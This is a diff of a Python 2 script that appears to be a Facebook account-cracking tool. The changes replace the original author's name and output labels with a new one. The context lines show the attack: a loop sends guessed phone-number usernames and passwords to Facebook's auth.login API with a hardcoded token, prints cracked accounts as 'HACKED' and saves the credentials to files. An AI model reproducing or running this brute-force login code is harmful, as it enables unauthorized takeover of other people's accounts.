@@ -1,6 +1,6 @@
-#Tools Created By Talha Islam
-#Talha Technology Channel
-#The Decoder Of Bangladesh
+#Tools Created By Rihab Islam
+#Gorib Vai Gang Channel
+#The Codder Of Bangladesh
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
@@ -80,7 +80,7 @@ def cb():
  
 logo = """
                                                                       
-\033[0;94m  _____  _ _           _               
+\033[0;94m     _____  _ _           _               
 \033[0;94m    |  __ \(_) |         | |                        
 \033[0;96m    | |__) |_| |__   __ _| |__  
 \033[0;96m    |  _  /| | '_ \ / _` | '_ \ 
@@ -250,13 +250,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[Talha-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[Rihab-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[Talha-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
+                print '\x1b[1;91m[Rihab-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
